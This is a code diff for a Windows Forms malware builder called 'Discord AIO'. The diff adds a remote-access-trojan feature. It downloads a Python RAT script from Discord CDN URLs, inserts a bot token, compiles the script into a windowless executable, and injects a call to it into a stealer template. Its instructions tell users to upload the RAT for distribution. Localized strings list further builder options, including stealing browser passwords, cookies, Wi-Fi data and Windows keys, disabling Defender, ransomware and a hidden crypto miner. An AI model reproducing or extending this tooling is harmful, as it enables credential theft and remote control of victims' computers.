@@ -23,12 +23,14 @@ namespace discordAIO6
 {
     public partial class dAIOmain : Form
     {
-        private static string version = "0.6.0";
+        private static string version = "0.6.1";
 
         public DiscordRpcClient dc_client;
 
         [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
         private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);
+        private static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        private string aioDir = appdata + "\\Discord AIO";
 
         public dAIOmain()
         {
@@ -50,6 +52,7 @@ namespace discordAIO6
             additionalSite.Hide();
             miscSite.Hide();
             minerSite.Hide();
+            ratSite.Hide();
 
             usernameLabel.Text = Environment.UserName;
             versionLabel.Text = version;
@@ -60,6 +63,17 @@ namespace discordAIO6
 
             this._randomChars = new RandomCharacters();
             this.randomFileInfo_0 = new RandomInfo(this.randomCharacters_0);
+
+            if (!Directory.Exists(aioDir))
+            {
+                Directory.CreateDirectory(aioDir);
+                try
+                {
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950026185780375653/requirements.txt", aioDir + "\\requirements.txt");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950038854100983838/DiscordRAT.py", aioDir + "\\DiscordRAT.py");
+                }
+                catch { }
+            }
 
             DiscordRPC();
         }
@@ -155,6 +169,7 @@ namespace discordAIO6
             additionalSite.Hide();
             miscSite.Hide();
             minerSite.Hide();
+            ratSite.Hide();
         }
 
         private void btnInventory_Click(object sender, EventArgs e)
@@ -172,6 +187,7 @@ namespace discordAIO6
             additionalSite.Show();
             miscSite.Hide();
             minerSite.Hide();
+            ratSite.Hide();
         }
 
         private void btnWork_Click(object sender, EventArgs e)
@@ -189,6 +205,7 @@ namespace discordAIO6
             mainSite.Hide();
             miscSite.Hide();
             minerSite.Hide();
+            ratSite.Hide();
         }
 
         private void btnMap_Click(object sender, EventArgs e)
@@ -206,6 +223,7 @@ namespace discordAIO6
             inspectorSite.Hide();
             miscSite.Show();
             minerSite.Hide();
+            ratSite.Hide();
         }
 
         private void btnParty_Click(object sender, EventArgs e)
@@ -223,6 +241,25 @@ namespace discordAIO6
             inspectorSite.Hide();
             miscSite.Hide();
             minerSite.Show();
+            ratSite.Hide();
+        }
+
+        private void ratButton_Click(object sender, EventArgs e)
+        {
+            pnlNav.Height = ratButton.Height;
+            pnlNav.Top = ratButton.Top;
+            pnlNav.Left = ratButton.Left;
+            ratButton.BackColor = Color.FromArgb(11, 11, 11);
+
+            navLabel.Text = "Discord RAT";
+
+            mainSite.Hide();
+            settingsSite.Hide();
+            additionalSite.Hide();
+            inspectorSite.Hide();
+            miscSite.Hide();
+            minerSite.Hide();
+            ratSite.Show();
         }
 
         private void btnSettings_Click(object sender, EventArgs e)
@@ -240,8 +277,13 @@ namespace discordAIO6
             additionalSite.Hide();
             inspectorSite.Hide();
             minerSite.Hide();
+            ratSite.Hide();
         }
 
+        private void ratButton_Leave(object sender, EventArgs e)
+        {
+            ratButton.BackColor = Color.FromArgb(8, 8, 8);
+        }
         private void btnDashboard_Leave(object sender, EventArgs e)
         {
             btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
@@ -493,6 +535,27 @@ namespace discordAIO6
             button8.ForeColor = Color.DarkRed;
             button8.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
             button8.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            label39.ForeColor = Color.DarkRed;
+            ratButton.ForeColor = Color.DarkRed;
+            ratBox.ForeColor = Color.DarkRed;
+            pipBox.ForeColor = Color.DarkRed;
+            label44.ForeColor = Color.DarkRed;
+            rURLBox.ForeColor = Color.DarkRed;
+            label42.ForeColor = Color.DarkRed;
+            label40.ForeColor = Color.DarkRed;
+            ratTokenBox.ForeColor = Color.DarkRed;
+            label43.ForeColor = Color.DarkRed;
+            label45.ForeColor = Color.DarkRed;
+            label41.ForeColor = Color.DarkRed;
+            ratInstallButton.ForeColor = Color.DarkRed;
+            ratInstallButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            ratInstallButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            insertButton.ForeColor = Color.DarkRed;
+            insertButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            insertButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            ratCompileButton.ForeColor = Color.DarkRed;
+            ratCompileButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            ratCompileButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
         }
 
         private void button1_Click(object sender, EventArgs e)
@@ -700,6 +763,28 @@ namespace discordAIO6
             button8.ForeColor = Color.LimeGreen;
             button8.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
             button8.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            label39.ForeColor = Color.LimeGreen;
+            ratButton.ForeColor = Color.LimeGreen;
+            ratBox.ForeColor = Color.LimeGreen;
+            pipBox.ForeColor = Color.LimeGreen;
+            label44.ForeColor = Color.LimeGreen;
+            rURLBox.ForeColor = Color.LimeGreen;
+            label42.ForeColor = Color.LimeGreen;
+            label40.ForeColor = Color.LimeGreen;
+            ratTokenBox.ForeColor = Color.LimeGreen;
+            label43.ForeColor = Color.LimeGreen;
+            label45.ForeColor = Color.LimeGreen;
+            label41.ForeColor = Color.LimeGreen;
+            ratInstallButton.ForeColor = Color.LimeGreen;
+            ratInstallButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            ratInstallButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            insertButton.ForeColor = Color.LimeGreen;
+            insertButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            insertButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            ratCompileButton.ForeColor = Color.LimeGreen;
+            ratCompileButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            ratCompileButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+
         }
 
         private void button2_Click(object sender, EventArgs e)
@@ -907,6 +992,27 @@ namespace discordAIO6
             button8.ForeColor = Color.DodgerBlue;
             button8.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
             button8.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            label39.ForeColor = Color.DodgerBlue;
+            ratButton.ForeColor = Color.DodgerBlue;
+            ratBox.ForeColor = Color.DodgerBlue;
+            pipBox.ForeColor = Color.DodgerBlue;
+            label44.ForeColor = Color.DodgerBlue;
+            rURLBox.ForeColor = Color.DodgerBlue;
+            label42.ForeColor = Color.DodgerBlue;
+            label40.ForeColor = Color.DodgerBlue;
+            ratTokenBox.ForeColor = Color.DodgerBlue;
+            label43.ForeColor = Color.DodgerBlue;
+            label45.ForeColor = Color.DodgerBlue;
+            label41.ForeColor = Color.DodgerBlue;
+            ratInstallButton.ForeColor = Color.DodgerBlue;
+            ratInstallButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            ratInstallButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            insertButton.ForeColor = Color.DodgerBlue;
+            insertButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            insertButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            ratCompileButton.ForeColor = Color.DodgerBlue;
+            ratCompileButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            ratCompileButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
         }
 
         private void button3_Click(object sender, EventArgs e)
@@ -1114,6 +1220,27 @@ namespace discordAIO6
             button8.ForeColor = Color.Gainsboro;
             button8.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
             button8.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            label39.ForeColor = Color.Gainsboro;
+            ratButton.ForeColor = Color.Gainsboro;
+            ratBox.ForeColor = Color.Gainsboro;
+            pipBox.ForeColor = Color.Gainsboro;
+            label44.ForeColor = Color.Gainsboro;
+            rURLBox.ForeColor = Color.Gainsboro;
+            label42.ForeColor = Color.Gainsboro;
+            label40.ForeColor = Color.Gainsboro;
+            ratTokenBox.ForeColor = Color.Gainsboro;
+            label43.ForeColor = Color.Gainsboro;
+            label45.ForeColor = Color.Gainsboro;
+            label41.ForeColor = Color.Gainsboro;
+            ratInstallButton.ForeColor = Color.Gainsboro;
+            ratInstallButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
+            ratInstallButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            insertButton.ForeColor = Color.Gainsboro;
+            insertButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
+            insertButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            ratCompileButton.ForeColor = Color.Gainsboro;
+            ratCompileButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
+            ratCompileButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
         }
 
         private void shYes_Click(object sender, EventArgs e)
@@ -1288,7 +1415,14 @@ namespace discordAIO6
         string lpassword = "Password";
         string lusage = "CPU usage";
         string minerInstruction = "1. Setup your pool (ex. pool.minergate.com:443)\n2. Setup your username. If you're using minergate fill in your email address.\n3. To setup workers' name change password variable.";
-
+        string lrequire = "Requirements installation";
+        string linstertt = "Insert token";
+        string linstall = "Install";
+        string pipinstall = "PIP installed";
+        string compile = "Compile";
+        string compilerat = "Compile RAT";
+        string linsert = "Insert";
+        string instruction2 = "1. Create discord bot, add it to your server (with administrator privileges).\n2. Install python3.\n3. Click install button.\n4. Insert discord bot token and press Insert button.\n5. Click compile rat button.\n6. Upload compiled rat to website/discord.\n7. Provide url of compiled rat into.\n8. Check Discord RAT in additional page.\n\nCommands are on our discord server.\nIf you cannot compile RAT, uninstall enum34 package with <py -m pip uninstall enum34>";
 
 
 
@@ -1383,6 +1517,14 @@ namespace discordAIO6
             label53.Text = lpassword;
             label37.Text = lusage;
             label52.Text = minerInstruction;
+            label41.Text = instruction2;
+            label40.Text = lrequire;
+            pipBox.Text = pipinstall;
+            ratInstallButton.Text = linstall;
+            label43.Text = linstertt;
+            insertButton.Text = linsert;
+            label45.Text = compilerat;
+            ratCompileButton.Text = compile;
         }
 
 
@@ -1507,6 +1649,14 @@ namespace discordAIO6
             lpassword = "Password";
             lusage = "CPU usage";
             minerInstruction = "1. Setup your pool (ex. pool.minergate.com:443)\n2. Setup your username. If you're using minergate fill in your email address.\n3. To setup workers' name change password variable.";
+            lrequire = "Requirements installation";
+            linstertt = "Insert token";
+            linstall = "Install";
+            pipinstall = "PIP installed";
+            compile = "Compile";
+            compilerat = "Compile RAT";
+            linsert = "Insert";
+            instruction2 = "1. Create discord bot, add it to your server (with administrator privileges).\n2. Install python3.\n3. Click install button.\n4. Insert discord bot token and press Insert button.\n5. Click compile rat button.\n6. Upload compiled rat to website/discord.\n7. Provide url of compiled rat into.\n8. Check Discord RAT in additional page.\n\nCommands are on our discord server.\nIf you cannot compile RAT, uninstall enum34 package with <py -m pip uninstall enum34>";
 
 
             refreshLanguage();
@@ -1633,6 +1783,14 @@ namespace discordAIO6
             lpassword = "Пароль";
             lusage = "использование процессора";
             minerInstruction = "1. Настройте свой пул (например, pool.minergate.com:443)\n2. Настройте свое имя пользователя. Если вы используете Minergate, введите свой адрес электронной почты.\n3. Чтобы настроить переменную пароля смены имени воркера.";
+            lrequire = "Установка требований";
+            linstertt = "Вставлять token";
+            linstall = "Установить";
+            pipinstall = "PIP установлены";
+            compile = "Компиляция";
+            compilerat = "Компиляция RAT";
+            linsert = "Вставлять";
+            instruction2 = "1. Создайте дискорд-бота, добавьте его на свой сервер (с правами администратора).\n2. Установите питон3.\n3. Нажмите кнопку «Установить».\n4. Вставьте токен бота раздора и нажмите кнопку Вставить.\n5. Нажмите кнопку «Скомпилировать крысу».\n6. Загрузить скомпилированную крысу на сайт/дискорд.\n7. Укажите URL-адрес скомпилированного файла rat в.\n8. Проверьте Discord RAT на дополнительной странице.\n\nКоманды находятся на нашем сервере discord.\nЕсли вы не можете скомпилировать RAT, удалите пакет enum34 с помощью <py -m pip uninstall enum34>";
 
             refreshLanguage();
         }
@@ -1645,6 +1803,129 @@ namespace discordAIO6
             polishButton.FlatAppearance.BorderSize = 0;
             spanishButton.FlatAppearance.BorderSize = 0;
             turkishButton.FlatAppearance.BorderSize = 0;
+
+            translateLabel.Text = "null";
+            translateLabel.ForeColor = Color.FromArgb(5, 5, 5);
+
+            sthww = "Quelque chose s'est mal passé.";
+            red = "Rouge";
+            green = "Vert";
+            blue = "Bleu";
+            white = "Blanc";
+            lversion = "Version:";
+            uicolor = "UI Couleur:";
+            susername = "Afficher le nom:";
+            cupdates = "Mettre à jour:";
+            language = "Langue:";
+            settings = "Réglages";
+            lmain = "Principal";
+            additional = "Supplémentaire";
+            inspector = "Inspecteur";
+            misc = "Divers";
+            yes = "Oui";
+            no = "Non";
+            check = "Vérifier";
+            upload = "Télécharger";
+            licon = "Icône";
+            build = "Construire";
+            clone = "Cloner";
+            generate = "Générer";
+            fInfo = "Métadonnées:";
+            none = "Aucun";
+            whcbe = "Webhook ne peut pas être vide!";
+            whvalid = "Webhook valide.";
+            whinvalid = "Webhook non valide.";
+            generateorclone = "Vous devez générer ou cloner des métadonnées.";
+            pumpinfo = "Vous devez fournir la taille du fichier de sortie!";
+            selectpumpsize = "Vous devez sélectionner la taille de la pompe.";
+            pumpedTo = "Fichier pompé vers ";
+            whdeleted = "Webhook supprimé.";
+            whfstop = "Webhook flooder arrêté.";
+            whusmsempty = "Webhook, le nom et le message ne peuvent pas être vides!";
+            toomany = "Trop de demandes.\nSpam retardé.";
+            start = "Start";
+            stop = "Stop";
+            started = "A débuté";
+            stopped = "Arrêté";
+            cpuusage = "Sélectionnez l'utilisation du processeur.";
+            poolusrname = "Fournissez le pool, le nom d'utilisateur et le mot de passe.";
+            compdone = "Compilation terminée.";
+            addcreated = "Options supplémentaires créées. Compilation...";
+            savedas = "Enregistré sous ";
+            creatingadds = "Création d'options supplémentaires...";
+            creatingfile = "Création de fichier...";
+            openingexp = "Ouverture de l'explorateur...";
+            tokencannotempt = "Le jeton ne peut pas être vide!";
+            invalidtoken = "Token invalide.";
+            tokendeleted = "Token supprimé.";
+            disabled = "Désactivé";
+            enabled = "Autorisé";
+            unverified = "Non vérifié";
+            verified = "Vérifié";
+            nopass = "Aucun mot de passe!";
+            nocookies = "Pas de cookies!";
+            nohistory = "Pas d'historique!";
+            novpn = "Pas de VPN!";
+            nowifinetwork = "Aucune donnée de réseau Wi-Fi!";
+            nowifipass = "Pas de mots de passe Wi-Fi";
+            lminer = "Mineur";
+            filecreated = "Fichier créé. S'il vous plaît, attendez...";
+            exportas = "Exporter (au format .txt)";
+            credentials = "Donnés";
+            dName = "Nom:";
+            dIP = "Adresse IP:";
+            dMAC = "Adresse MAC:";
+            dToken = "DC Token:";
+            dWin = "Clé WIN:";
+            embedcolor = "Intégrer la couleur";
+            select = "Sélectionner";
+            idle = "Inactif...";
+            delete = "Supprimer";
+            pump = "Pompe";
+            filepumper = "Pompe à lime";
+            lusername = "Nom";
+            lmessage = "Un message";
+            floodercolor = "Intégrer la couleur";
+            whflooder = "Webhook flooder";
+            deletewh = "Supprimer webhook";
+            deletetkn = "Supprimer token";
+            safemode = "Mode sans échec";
+            addsettings = "Paramètres additionnels";
+            fakeerror = "Fausse erreur";
+            ltitle = "Titre";
+            customplugin = "Plugin personnalisé";
+            lobfuscate = "Brouiller";
+            rostart = "Exécuter au démarrage";
+            disabledefender = "Désactiver Windows Defender";
+            disablemanager = "Désactiver Task Manager";
+            lbsod = "Blue Screen";
+            wbblocker = "Bloqueur de site Web";
+            lhide = "Masquer le voleur";
+            ljumpscare = "Jumpscare";
+            disableinput = "Désactiver la souris et le clavier";
+            swindowskey = "Voler la clé de Windows";
+            spasswords = "Voler les mots de passe du navigateur";
+            scookies = "Voler les cookies du navigateur";
+            svpnc = "Voler un VPN";
+            wifidata = "Voler WiFi data";
+            disableinternet = "Désactiver Internet";
+            shistory = "Voler l'historique du navigateur";
+            cminer = "Mineur de crypto";
+            lransomware = "Ransomware";
+            mpool = "Piscine Monero";
+            lpassword = "Mot de passe";
+            lusage = "l'utilisation du processeur";
+            minerInstruction = "1. Configurez votre pool (ex. pool.minergate.com:443)\n2. Configurez votre nom d'utilisateur. Si vous utilisez minergate, indiquez votre adresse e-mail.\n3. Pour configurer la variable de mot de passe de modification du nom des travailleurs.";
+            lrequire = "Exigences d'installation";
+            linstertt = "Insérer token";
+            linstall = "Installer";
+            pipinstall = "PIP installé";
+            compile = "Compiler";
+            compilerat = "Compiler RAT";
+            linsert = "Insérer";
+            instruction2 = "1. Créez un bot Discord, ajoutez-le à votre serveur (avec des privilèges d'administrateur).\n2. Installez python3.\n3. Cliquez sur le bouton d'installation.\n4. Insérez le jeton du bot Discord et appuyez sur le bouton Insérer.\n5. Cliquez sur le bouton compiler rat.\n6. Téléchargez le rat compilé sur le site Web/discord.\n7. Fournissez l'URL du rat compilé dans.\n8. Vérifiez Discord RAT dans une page supplémentaire.\n\nLes commandes sont sur notre serveur Discord.\nSi vous ne pouvez pas compiler RAT, désinstallez le package enum34 avec <py -m pip uninstall enum34>";
+
+            refreshLanguage();
         }
 
         private void polishButton_Click(object sender, EventArgs e)
@@ -1768,6 +2049,14 @@ namespace discordAIO6
             lpassword = "Hasło";
             lusage = "Zużycie CPU";
             minerInstruction = "1. Ustaw swój portfel (np. pool.minergate.com:443)\n2. Ustaw nazwę. Jeśli używasz minergate wprowadź swój email.\n3. Aby ustawić imiona pracowników' zmień hasło.";
+            lrequire = "Instalacja wymagań";
+            linstertt = "Wstaw token";
+            linstall = "Instaluj";
+            pipinstall = "PIP zainstalowany";
+            compile = "Kompiluj";
+            compilerat = "Kompiluj RAT";
+            linsert = "Wstaw";
+            instruction2 = "1. Utwórz bota Discord, dodaj go do swojego serwera (z uprawnieniami administratora).\n2. Zainstaluj Pythona3.\n3. Kliknij przycisk instalacji.\n4. Wstaw token bota Discord i naciśnij przycisk Wstaw.\n5. Kliknij przycisk kompilacji RAT.\n6. Prześlij skompilowany RAT do witryny/discord.\n7. Podaj adres URL skompilowanego RAT.\n8. Zaznacz Discord RAT na dodatkowej stronie.\n\nPolecenia są na naszym serwerze Discord.\nJeśli nie możesz skompilować RAT, odinstaluj pakiet enum34 za pomocą <py -m pip uninstall enum34>";
 
             refreshLanguage();
         }
@@ -1780,6 +2069,129 @@ namespace discordAIO6
             polishButton.FlatAppearance.BorderSize = 0;
             spanishButton.FlatAppearance.BorderSize = 1;
             turkishButton.FlatAppearance.BorderSize = 0;
+
+            translateLabel.Text = "null";
+            translateLabel.ForeColor = Color.FromArgb(5, 5, 5);
+
+            sthww = "Algo salió mal.";
+            red = "Rojo";
+            green = "Verde";
+            blue = "Azul";
+            white = "Blanco";
+            lversion = "Versión:";
+            uicolor = "UI Color:";
+            susername = "Mostrar nombre:";
+            cupdates = "Actualizar:";
+            language = "Idioma:";
+            settings = "Ajustes";
+            lmain = "Casa";
+            additional = "Adicional";
+            inspector = "Inspector";
+            misc = "Varios";
+            yes = "Sí";
+            no = "No";
+            check = "Controlar";
+            upload = "Subir";
+            licon = "Icono";
+            build = "Construir";
+            clone = "Clon";
+            generate = "Generar";
+            fInfo = "Metadatos:";
+            none = "Ninguno";
+            whcbe = "Webhook no puede estar vacía!";
+            whvalid = "Webhook válido.";
+            whinvalid = "Webhook no válido.";
+            generateorclone = "Necesitas generar o clonar metadatos.";
+            pumpinfo = "Debe proporcionar el tamaño del archivo de salida!";
+            selectpumpsize = "Debe seleccionar el tamaño de la bomba..";
+            pumpedTo = "Archivo bombeado a ";
+            whdeleted = "Webhook eliminado.";
+            whfstop = "Inundador de webhook detenido.";
+            whusmsempty = "El webhook, el nombre y el mensaje no pueden estar vacíos!";
+            toomany = "Demasiadas solicitudes.\nSpam retrasado.";
+            start = "Start";
+            stop = "Stop";
+            started = "Empezado";
+            stopped = "Detenido";
+            cpuusage = "Seleccione el uso de la CPU.";
+            poolusrname = "Proporcionar grupo, nombre de usuario y contraseña.";
+            compdone = "Compilación hecha.";
+            addcreated = "Opciones adicionales creadas. Compilando...";
+            savedas = "Guardado como ";
+            creatingadds = "Creación de opciones adicionales...";
+            creatingfile = "Crear archivo...";
+            openingexp = "Explorador de apertura...";
+            tokencannotempt = "El token no puede estar vacío!";
+            invalidtoken = "Token no valido.";
+            tokendeleted = "Token eliminado.";
+            disabled = "Discapacitado";
+            enabled = "Activado";
+            unverified = "Inconfirmado";
+            verified = "Confirmado";
+            nopass = "Sin contraseñas!";
+            nocookies = "No galletas!";
+            nohistory = "No historia!";
+            novpn = "No VPN!";
+            nowifinetwork = "No WiFi Network data!";
+            nowifipass = "No WiFi passwords";
+            lminer = "Minero";
+            filecreated = "Archivo creado. Espere por favor...";
+            exportas = "Exportar (como .txt)";
+            credentials = "Datos";
+            dName = "Nombre:";
+            dIP = "Dirección IP:";
+            dMAC = "Dirección MAC:";
+            dToken = "DC Token:";
+            dWin = "WIN Llave:";
+            embedcolor = "Color incrustado";
+            select = "Seleccione";
+            idle = "Inactivo...";
+            delete = "Borrar";
+            pump = "Bomba";
+            filepumper = "Bomba";
+            lusername = "Nombre";
+            lmessage = "Mensaje";
+            floodercolor = "Color incrustado";
+            whflooder = "Webhook flooder";
+            deletewh = "Eliminar webhook";
+            deletetkn = "Eliminar token";
+            safemode = "Modo seguro";
+            addsettings = "Ajustes adicionales";
+            fakeerror = "Error falso";
+            ltitle = "Título";
+            customplugin = "Custom plugin";
+            lobfuscate = "Ofuscar";
+            rostart = "Corre al empezar";
+            disabledefender = "Deshabilitar Windows Defender";
+            disablemanager = "Deshabilitar Task Manager";
+            lbsod = "Blue Screen";
+            wbblocker = "Website blocker";
+            lhide = "Ladrón de pieles";
+            ljumpscare = "Jumpscare";
+            disableinput = "Deshabilitar mouse y teclado";
+            swindowskey = "Robar clave de windows";
+            spasswords = "Robar contraseñas del navegador";
+            scookies = "Robar cookies del navegador";
+            svpnc = "Robar VPN";
+            wifidata = "Robar WiFi data";
+            disableinternet = "Deshabilitar internet";
+            shistory = "Robar historial del navegador";
+            cminer = "Cripto minero";
+            lransomware = "Ransomware";
+            mpool = "Grupo monero";
+            lpassword = "Clave";
+            lusage = "Uso de CPU";
+            minerInstruction = "1. Configure su grupo (por ejemplo, pool.minergate.com:443)\n2. Configure su nombre de usuario. Si está utilizando Minergate, complete su dirección de correo electrónico.\n3. Para configurar la variable de contraseña de cambio de nombre de los trabajadores.";
+            lrequire = "Instalación de requisitos";
+            linstertt = "Insertar token";
+            linstall = "Instalar";
+            pipinstall = "PIP instalado";
+            compile = "Compilar";
+            compilerat = "Compilar RAT";
+            linsert = "Insertar";
+            instruction2 = "1. Cree un bot de discord, agréguelo a su servidor (con privilegios de administrador).\n2. Instale python3.\n3. Haga clic en el botón de instalación.\n4. Inserte el token del bot de discordia y presione el botón Insertar.\n5. Haga clic en el botón compilar rat.\n6. Cargue la rata compilada en el sitio web/discord.\n7. Proporcione la URL de la rata compilada en.\n8. Compruebe Discord RAT en la página adicional.\n\nLos comandos están en nuestro servidor de discordia.\nSi no puede compilar RAT, desinstale el paquete enum34 con <py -m pip uninstall enum34>";
+
+            refreshLanguage();
         }
 
         private void turkishButton_Click(object sender, EventArgs e)
@@ -1903,6 +2315,14 @@ namespace discordAIO6
             lpassword = "Şifre";
             lusage = "CPU kullanımı";
             minerInstruction = "1. Havuzunuzu kurun (ör. pool.minergate.com:443)\n2. Kullanıcı adınızı ayarlayın. Minergate kullanıyorsanız e-posta adresinizi girin.\n3. İşçilerin adını ayarlamak için parola değişkenini değiştirin.";
+            lrequire = "Gereksinim yükleme";
+            linstertt = "Sokmak token";
+            linstall = "Düzenlemek";
+            pipinstall = "PIP Kurulmuş";
+            compile = "Derlemek";
+            compilerat = "Derlemek RAT";
+            linsert = "Sokmak";
+            instruction2 = "1. Discord botu oluşturun, sunucunuza ekleyin (yönetici ayrıcalıklarıyla).\n2. python3'ü yükleyin.\n3. Yükle düğmesini tıklayın.\n4. Discord bot jetonunu yerleştirin ve Ekle düğmesine basın.\n5. Derleme fare düğmesini tıklayın.\n6. Derlenmiş fareyi web sitesine/discord'a yükleyin.\n7. Derlenmiş farenin URL'sini girin.\n8. Ek sayfada Discord RAT'ı kontrol edin.\n\nKomutlar discord sunucumuzda.\nRAT derleyemiyorsanız, enum34 paketini <py -m pip uninstall enum34> ile kaldırın";
 
             refreshLanguage();
         }
@@ -2086,6 +2506,11 @@ namespace discordAIO6
                             //        text = text.Replace("//takepic", "TakePicture();");
                             //    }
                             // Jumpscare
+                            if (ratBox.Checked)
+                            {
+                                text = text.Replace("//ratoverhere", "RunRAT();");
+                                text = text.Replace("%raturlrightthere%", rURLBox.Text);
+                            }
                             if (jumpscareBox.Checked)
                             {
                                 text = text.Replace("//jumpscare", "Jumpscare();");
@@ -2935,6 +3360,114 @@ namespace discordAIO6
                 checkingLabel.Text = "There is a newer version avaible [" + downloadedVersion + "]";
             }
 
+        }
+
+        private bool checkIfPythonIsInstalled()
+        {
+            bool pyResult;
+            Process pyCheck = new Process();
+            pyCheck.StartInfo.FileName = @"cmd.exe";
+            pyCheck.StartInfo.Arguments = "/C py --version";
+            pyCheck.StartInfo.UseShellExecute = false;
+            pyCheck.StartInfo.RedirectStandardOutput = true;
+            pyCheck.StartInfo.CreateNoWindow = true;
+            pyCheck.Start();
+
+            if (pyCheck.StandardOutput.ReadToEnd().Contains("Python"))
+                pyResult = true;
+            else
+                pyResult = false;
+
+            pyCheck.WaitForExit();
+            return pyResult;
+        }
+
+        private void ratInstallButton_Click(object sender, EventArgs e)
+        {
+            bool amIhere = checkIfPythonIsInstalled();
+            if (amIhere)
+            {
+                if (pipBox.Checked)
+                {
+                    // REQUIREMENTS
+                    Process requreInstall = new Process();
+                    requreInstall.StartInfo.FileName = @"cmd.exe";
+                    requreInstall.StartInfo.WorkingDirectory = aioDir;
+                    requreInstall.StartInfo.Arguments = "/C py -m pip install -r requirements.txt";
+                    requreInstall.StartInfo.UseShellExecute = true;
+                    requreInstall.Start();
+                    requreInstall.WaitForExit();
+
+                    // PYINSTALLER
+                    Process installerInstall = new Process();
+                    installerInstall.StartInfo.FileName = @"cmd.exe";
+                    installerInstall.StartInfo.Arguments = "/C py -m pip install pyinstaller";
+                    installerInstall.StartInfo.UseShellExecute = true;
+                    installerInstall.Start();
+                    installerInstall.WaitForExit();
+
+                    PopupMessage("All dependencies were installed.");
+                }
+                else
+                {
+                    // PIP
+                    Process pipInstall = new Process();
+                    pipInstall.StartInfo.FileName = @"cmd.exe";
+                    pipInstall.StartInfo.Arguments = "/C py -m ensurepip";
+                    pipInstall.StartInfo.UseShellExecute = true;
+                    pipInstall.Start();
+                    pipInstall.WaitForExit();
+
+                    // REQUIREMENTS
+                    Process requreInstall = new Process();
+                    requreInstall.StartInfo.FileName = @"cmd.exe";
+                    requreInstall.StartInfo.WorkingDirectory = aioDir;
+                    requreInstall.StartInfo.Arguments = "/C py -m pip install -r requirements.txt";
+                    requreInstall.StartInfo.UseShellExecute = true;
+                    requreInstall.Start();
+                    requreInstall.WaitForExit();
+
+                    // PYINSTALLER
+                    Process installerInstall = new Process();
+                    installerInstall.StartInfo.FileName = @"cmd.exe";
+                    installerInstall.StartInfo.Arguments = "/C py -m pip install pyinstaller";
+                    installerInstall.StartInfo.UseShellExecute = true;
+                    installerInstall.Start();
+                    installerInstall.WaitForExit();
+
+                    PopupMessage("All dependencies were installed.");
+                }
+            }
+            else
+                PopupMessage("You need to install python first!\nOr the wrong version is installed.");
+        }
+
+        private void insertButton_Click(object sender, EventArgs e)
+        {
+            string pyText = File.ReadAllText(aioDir + "\\DiscordRAT.py");
+            pyText = pyText.Replace("%mytokenrighthere%", ratTokenBox.Text);
+            File.WriteAllText(aioDir + "\\DiscordRAT.py", pyText);
+            PopupMessage("Token inserted.");
+        }
+
+        private void ratCompileButton_Click(object sender, EventArgs e)
+        {
+            Process compileRAT = new Process();
+            compileRAT.StartInfo.FileName = @"cmd.exe";
+            compileRAT.StartInfo.WorkingDirectory = aioDir;
+            compileRAT.StartInfo.Arguments = "/C py -m PyInstaller --onefile --noconsole \"DiscordRAT.py\"";
+            compileRAT.StartInfo.UseShellExecute = true;
+            compileRAT.Start();
+            compileRAT.WaitForExit();
+
+            File.Delete(aioDir + "\\DiscordRAT.py");
+            try
+            {
+                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950038854100983838/DiscordRAT.py", aioDir + "\\DiscordRAT.py");
+            }
+            catch { }
+
+            PopupMessage("Discord RAT compiled.\n[%AppData%/Discord AIO/dist]\nPlease follow the instructions.");
         }
     }
 }
